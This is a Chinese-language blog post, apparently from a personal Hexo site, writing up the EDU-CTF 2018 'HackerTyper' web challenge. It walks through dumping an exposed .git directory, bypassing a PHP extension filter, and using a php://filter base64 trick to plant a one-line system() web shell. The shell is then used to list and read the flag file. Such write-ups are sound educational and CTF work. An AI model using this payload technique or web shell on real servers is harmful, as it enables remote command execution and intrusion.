@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.0.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.woolninesun.org","root":"/","scheme":"Gemini","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"left","display":"hide","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false};
+  </script>
+
+  <meta name="description" content="題目點進去會看到一個風格很 hacker 的網站，觀察 js 後發現什麼也沒有zzz">
+<meta property="og:type" content="article">
+<meta property="og:title" content="EDU-CTF 2018 - HackerTyper">
+<meta property="og:url" content="https://blog.woolninesun.org/posts/1d24c795/index.html">
+<meta property="og:site_name" content="奈尚羊毛">
+<meta property="og:description" content="題目點進去會看到一個風格很 hacker 的網站，觀察 js 後發現什麼也沒有zzz">
+<meta property="og:locale">
+<meta property="article:published_time" content="2019-01-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2019-01-31T16:00:00.000Z">
+<meta property="article:author" content="WooLNinesun">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="php">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.woolninesun.org/posts/1d24c795/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh'
+  };
+</script>
+
+  <title>EDU-CTF 2018 - HackerTyper | 奈尚羊毛</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <main class="main">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+        <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">奈尚羊毛</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">願如同童話裡的山羊般咀嚼知識</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-首頁">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首頁</a>
+
+  </li>
+        <li class="menu-item menu-item-文章">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>文章</a>
+
+  </li>
+        <li class="menu-item menu-item-分類">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分類</a>
+
+  </li>
+        <li class="menu-item menu-item-關於">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>關於</a>
+
+  </li>
+        <li class="menu-item menu-item-留言">
+
+    <a href="/comments/" rel="section"><i class="fa fa-comments fa-fw"></i>留言</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <section class="post-toc-wrap sidebar-panel">
+          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%AD%A3%E6%96%87"><span class="nav-number">1.</span> <span class="nav-text">[正文]</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Analysis"><span class="nav-number">1.1.</span> <span class="nav-text">Analysis</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PATHINFO-EXTENSION"><span class="nav-number">1.1.1.</span> <span class="nav-text">PATHINFO_EXTENSION</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Gen-Payload"><span class="nav-number">1.2.</span> <span class="nav-text">Gen Payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Get-shell"><span class="nav-number">1.3.</span> <span class="nav-text">Get shell</span></a></li></ol></li></ol></div>
+      </section>
+      <!--/noindex-->
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="WooLNinesun"
+      src="/uploads/avatar.png">
+  <p class="site-author-name" itemprop="name">WooLNinesun</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/woolninesun" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;woolninesun" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:WooLNinesun+blog@gmail.com" title="E-Mail → mailto:WooLNinesun+blog@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </section>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </header>
+
+      
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div id="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+      <div class="main-inner">
+        
+
+        <div class="content post posts-expand">
+          
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
+    <link itemprop="mainEntityOfPage" href="https://blog.woolninesun.org/posts/1d24c795/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.png">
+      <meta itemprop="name" content="WooLNinesun">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="奈尚羊毛">
+    </span>
+
+    
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          EDU-CTF 2018 - HackerTyper
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-02-01 00:00:00" itemprop="dateCreated datePublished" datetime="2019-02-01T00:00:00+08:00">2019-02-01</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Capture-The-Flag/" itemprop="url" rel="index"><span itemprop="name">Capture The Flag</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Capture-The-Flag/EDU-CTF-2018/" itemprop="url" rel="index"><span itemprop="name">EDU-CTF 2018</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>題目點進去會看到一個風格很 hacker 的網站，觀察 js 後發現什麼也沒有zzz</p>
+<a id="more"></a>
+
+<h1 id="正文"><a href="#正文" class="headerlink" title="[正文]"></a>[正文]</h1><p>透過簡單的測試發現它有 <code>.git</code>，卻沒有擋掉 <code>.git/*</code>，馬上用 <code>dvcs-ripper</code> 拉下來，checkout 後得到 source code!</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> perl rip-git.pl -vv -o ./ -u http://final.kaibro.tw:10003/.git</span></span><br><span class="line">[i] Downloading git files from http://final.kaibro.tw:10003/.git </span><br><span class="line">...</span><br><span class="line">[i] Got items with git fsck: 0, Items fetched: 0</span><br><span class="line">[!] No more items to fetch. That&#x27;s it!</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span></span></span><br><span class="line">...</span><br><span class="line">commit c593e752192d5a2159bf8d9d00e639f8ada5deb5</span><br><span class="line">Author: root &lt;root@83a85fdd8851.(none)&gt;</span><br><span class="line">Date:   Thu Jan 10 21:56:36 2019 -0500</span><br><span class="line"></span><br><span class="line">    update</span><br><span class="line">...</span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout c593e7521</span></span><br><span class="line">...</span><br><span class="line">HEAD is now at c593e75 update</span><br><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line">code.txt  index.php*  script.js  style.css</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><figcaption><span>index.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$sandbox = <span class="string">&quot;/var/www/html/sandbox/&quot;</span> . md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] . <span class="string">&quot;QQ&quot;</span>);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line">$path = <span class="string">&#x27;code.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">isset</span>($_GET[<span class="string">&#x27;_&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;f&#x27;</span>]) ) &#123;</span><br><span class="line"></span><br><span class="line">    $_ = $_GET[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">    $f = $_GET[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/h/is&quot;</span>, pathinfo($f, PATHINFO_EXTENSION)))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No h4cker will use h :p&quot;</span>);</span><br><span class="line"></span><br><span class="line">    $c = <span class="string">&quot;Q____Q&quot;</span> . base64_encode($_);</span><br><span class="line">    $path = <span class="string">&#x27;sandbox/&#x27;</span> . md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] . <span class="string">&quot;QQ&quot;</span>) . <span class="string">&#x27;/&#x27;</span> . $f;</span><br><span class="line"></span><br><span class="line">    @file_put_contents($f, $c);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><ol>
+<li><p>看到 <code>@file_put_contents($f, $c)</code>，推測用 <code>php://filter</code></p>
+</li>
+<li><p><code>$f</code> 會被 <code>preg_match(&quot;/h/is&quot;, pathinfo($f, PATHINFO_EXTENSION))</code> 過濾掉含 <code>h</code> 的副檔名，要 bypass WAF 的話，可以在後面加上 <code>/.</code> 讓 <code>pathinfo($f, PATHINFO_EXTENSION)</code> 回傳空字串，而 <code>@file_put_contents($f, $c)</code> 會忽略 <code>/.</code></p>
+<div class="note info"><h3 id="PATHINFO-EXTENSION"><a href="#PATHINFO-EXTENSION" class="headerlink" title="PATHINFO_EXTENSION"></a>PATHINFO_EXTENSION</h3><p>它會回傳最後一個 <code>.</code> 後面的內容當做副檔名，沒有東西的話會回傳空字串</p>
+</div></li>
+<li><p><code>$c</code> 是 <code>base64_encode($_) + &quot;Q____Q&quot;</code>，沒辦法簡單的 base64_decode，base64 是 4 char block 的，且 decode 會忽略非 base64 字元，利用此性質建構 payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; generate payload</span><br><span class="line">            |----|----|----|----|----|----|----|----|----|----|</span><br><span class="line">1. payload  |xxx |xxx |xxx |xxx |xxx |xxx |xxx |xxx |x   |    |</span><br><span class="line">2. encode   |aaaa|bbbb|cccc|dddd|eeee|ffff|gggg|hhhh|ii&#x3D;&#x3D;|    |</span><br><span class="line">3. cut&amp;add  |QQaa|aabb|bbcc|ccdd|ddee|eeff|ffgg|gghh|hhii|    |</span><br><span class="line">4. decode   |yyy |yyy |yyy |yyy |yyy |yyy |yyy |yyy |yyy |    |</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; by site index.php, Q____Q &#x3D;&gt; QQ with base64 decode</span><br><span class="line">            |----|----|----|----|----|----|----|----|----|----|</span><br><span class="line">5. encode   |QQaa|aabb|bbcc|ccdd|ddee|eeff|ffgg|gghh|hhii|    |</span><br><span class="line">6. addQQ    |QQQQ|aaaa|bbbb|cccc|dddd|eeee|ffff|gggg|hhhh|ii  |</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; by php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode</span><br><span class="line">            |----|----|----|----|----|----|----|----|----|----|</span><br><span class="line">7. decode   |A?? |xxx |xxx |xxx |xxx |xxx |xxx |xxx |xxx |x   |</span><br></pre></td></tr></table></figure>
+
+<div class="note warning"><p>其中 2. 一定要找到 encode 完之後最後兩個為 <code>==</code> 的 payload，才能在步驟三把 <code>==</code> 消掉，並在前面加上任意兩個字元。</p>
+</div>
+
+
+</li>
+</ol>
+<h2 id="Gen-Payload"><a href="#Gen-Payload" class="headerlink" title="Gen Payload"></a>Gen Payload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = <span class="string">&#x27;&lt;?php system($_GET[0]);?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$payload = base64_encode($payload);</span><br><span class="line"><span class="keyword">if</span> ( strcmp( substr( $payload, <span class="number">-2</span> ), <span class="string">&#x27;==&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="keyword">die</span>( <span class="string">&quot;Not good base64_encode: $payload&quot;</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$payload = base64_decode( <span class="string">&#x27;QQ&#x27;</span> . substr( $payload, <span class="number">0</span>, <span class="number">-2</span> ) );</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;_=&#x27;</span> . urlencode($payload);</span><br></pre></td></tr></table></figure>
+
+<h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><p>將產生的 payload 放進 <code>$_GET[&quot;_&quot;]</code>，且 <code>$_GET[&quot;f&quot;]</code> = <code>php://filter</code></p>
+<figure class="highlight plain"><figcaption><span>Http request</span></figcaption><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;final.kaibro.tw:10003&#x2F;</span><br><span class="line">GET _&#x3D;$&#123;PAYLOAD&#125;</span><br><span class="line">    f&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;webshell.php&#x2F;.</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><figcaption><span>Http request</span></figcaption><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;final.kaibro.tw:10003&#x2F;sandbox&#x2F;$(md5(IP))&#x2F;webshell.php</span><br><span class="line">GET 0&#x3D;ls%20&#x2F;</span><br><span class="line">bin boot dev etc flag_is_in_it.php ...</span><br><span class="line">GET 0&#x3D;cat%20&#x2F;flag_is_in_it.php</span><br><span class="line">&lt;?php</span><br><span class="line">$s &#x3D; &quot;bY5dT8IwFIbv&#x2F;RWjYWtryAIr4QbRZdx45Q16oQhnH2mriRk4GNEQ+O2eno0ICVdtn&#x2F;e8z+ndQ1EXN13wJh6&#x2F;jefBMX3nfMmX4j6NOikfY0RZEDVBejxRwmNEcfsmECOYnIAjgseLDsIweuQyRIxZTpN+sECu3hLp5gmy6csUawMDtlawUsbCb5ltP8qtgk1fQz1c&#x2F;ygNX30Ahp3kit+p3F5T6F1mNwI3uq0QMt8wukHPM1br6lPgATq3AyW6pt5ZKSW125&#x2F;&#x2F;p6vSVKMhVNk6&#x2F;67QKMNWQLMoJW&#x2F;TTpom6dsvsINv9s9PrzPWO5Ni5dIDtP8P&quot;;</span><br><span class="line">eval(str_rot13(gzinflate(base64_decode($s))));</span><br><span class="line">&#x2F;&#x2F; find the flag!</span><br></pre></td></tr></table></figure>
+
+<p>不知道為啥，evel 會壞掉，只好 <code>echo str_rot13(gzinflate(base64_decode($s)))</code> 得到：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_ = <span class="string">&#x27;*@[&amp;~`\&#x27;&#x27;</span>^<span class="string">&#x27;^(&gt;`2!`&#x27;</span>;</span><br><span class="line">$__ = <span class="string">&#x27;&amp;2`\&#x27;&#x27;</span>^<span class="string">&#x27;`~!`&#x27;</span>;</span><br><span class="line">$___ = <span class="string">&#x27;;&#x27;</span>^<span class="string">&#x27;@&#x27;</span>;</span><br><span class="line">$____ = <span class="string">&#x27;@&#x27;</span>^<span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">$_____ = (<span class="string">&#x27;@]!&#x27;</span>^<span class="string">&#x27;.2U&#x27;</span>).$__;</span><br><span class="line">$o = <span class="string">&#x27;@%&amp;]&#x27;</span>^<span class="string">&#x27;3MO)&#x27;</span>;</span><br><span class="line">$$o = <span class="string">&quot;PHP___1s_th3_b3st_languag3_f0r_h4ck3r_y0__&quot;</span>;</span><br><span class="line">$O = (<span class="string">&#x27;@]!&#x27;</span>^<span class="string">&#x27;.2U&#x27;</span>).$_;</span><br><span class="line">$$_ = sprintf($__.$___.<span class="string">&quot;%s&quot;</span>.$____, strrev(str_rot13($shit)));</span><br><span class="line">$$_____ = str_rot13(base64_encode($_).strrev($____.$_.$___));</span><br><span class="line">$$O = strrev(sprintf(<span class="string">&quot;&#125;%s&#123;GALF&quot;</span>, str_rot13($__).strrev($_____)));</span><br></pre></td></tr></table></figure>
+
+<p>仔細觀察後發現 <code>$$_</code> 就是 flag 了！</p>
+<p>FLAG: <code>FLAG&#123;__0l_e3xp4u_e0s_3tnhtany_gf3o_3ug_f1___CUC&#125;</code></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>WooLNinesun
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://blog.woolninesun.org/posts/1d24c795/" title="EDU-CTF 2018 - HackerTyper">https://blog.woolninesun.org/posts/1d24c795/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+              <a href="/tags/web/" rel="tag"># web</a>
+              <a href="/tags/php/" rel="tag"># php</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/efa4e0df/" rel="prev" title="EDU-CTF 2018 - TwoFile">
+      <i class="fa fa-chevron-left"></i> EDU-CTF 2018 - TwoFile
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/466363de/" rel="next" title="EDU-CTF 2018 - DuoRenSnake">
+      EDU-CTF 2018 - DuoRenSnake <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+        </div>
+        
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">WooLNinesun</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
